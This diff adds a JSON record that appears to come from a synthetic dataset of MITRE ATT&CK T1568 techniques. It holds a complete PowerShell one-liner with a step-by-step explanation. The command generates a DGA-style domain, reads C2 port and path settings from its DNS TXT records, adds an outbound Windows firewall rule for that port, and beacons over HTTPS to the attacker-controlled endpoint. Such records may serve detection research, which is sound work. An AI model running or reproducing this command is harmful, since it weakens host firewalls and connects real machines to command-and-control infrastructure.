@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('cdn{0}{1}.telemetry-cdn.com' -f (Get-Random -Min 1 -Max 9),(Get-Date -Format 'MMdd')); $txt=Resolve-DnsName $dom -Type TXT -Server '8.8.8.8' -ErrorAction SilentlyContinue; $txtstr=($txt | ForEach-Object { $_.Strings -join '' }) -join ''; $port=((Select-String -InputObject $txtstr -Pattern 'p=(\\d+)' -AllMatches).Matches.Value -replace 'p='); if(-not $port){ $port=10443 }; $path=((Select-String -InputObject $txtstr -Pattern 'path=([/\\w\\-]+)' -AllMatches).Matches.Value -replace 'path='); if([string]::IsNullOrWhiteSpace($path)){ $path='/update' }; $a=Resolve-DnsName $dom -Type A -Server '8.8.8.8' -ErrorAction SilentlyContinue; if($a){ netsh advfirewall firewall add rule name=('out_'+$port) dir=out action=allow protocol=TCP remoteport=$port | Out-Null; Invoke-WebRequest -Uri ('https://{0}:{1}{2}' -f $dom,$port,$path) -Headers @{ Host=$dom } -UseBasicParsing -TimeoutSec 6 } }",
+  "explanation": "Retrieves C2 parameters (port and path) from TXT records of a DGA domain, then opens the advertised port and connects over HTTPS using that path.",
+  "rationale_steps": [
+    "Generate a DGA domain and query TXT for dynamic configuration.",
+    "Parse the TXT payload for port and URL path.",
+    "Resolve A records and permit outbound traffic to the dynamic port.",
+    "Beacon to the constructed endpoint leveraging Host-based routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-4dcb8624",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
